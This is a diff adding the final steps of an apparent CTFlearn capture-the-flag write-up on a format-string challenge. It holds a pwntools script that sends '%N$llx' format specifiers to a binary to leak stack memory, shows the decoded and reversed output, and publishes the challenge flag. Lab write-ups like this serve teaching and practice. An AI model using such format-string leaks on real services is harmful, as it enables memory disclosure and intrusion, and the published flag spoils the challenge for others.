@@ -56,5 +56,62 @@ Which format tag is your favourite?
 11. To get the flag i made this script:
 
 ```py
+from pwn import *
+import os
+#64 bit
+os.system('clear')
 
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe], *a, **kw)
+
+exe = './task'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'debug'
+
+for i in range(50):
+    sh = start()
+    print("iter: ", i)
+    sh.sendlineafter(b'?', '%{}$llx'.format(i))
+    get = sh.recvline()
+    string = str(get)
+    print(string)
+
+sh.interactive()
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/221817968-47f92eef-e634-4da3-be1d-f0692c0b3a1e.png)
+
+
+12. Got many hex values, so i decode every one of them until i got the flag partition.
+
+> RESULT
+
+```
+}00t_5g4t_t4mr0f_3k1l_1{nraelFTC
+```
+
+13. Reverse the flag and we got it!
+
+```py
+import os
+
+os.system('cls')
+
+strings = '}00t_5g4t_t4mr0f_3k1l_1{nraelFTC'[::-1]
+print(strings)
+```
+
+![image](https://user-images.githubusercontent.com/70703371/221818484-ae457efc-7c45-4a81-998b-0b1fed5364f8.png)
+
+
+
+## FLAG
+
+```
+CTFlearn{1_l1k3_f0rm4t_t4g5_t00}
 ```
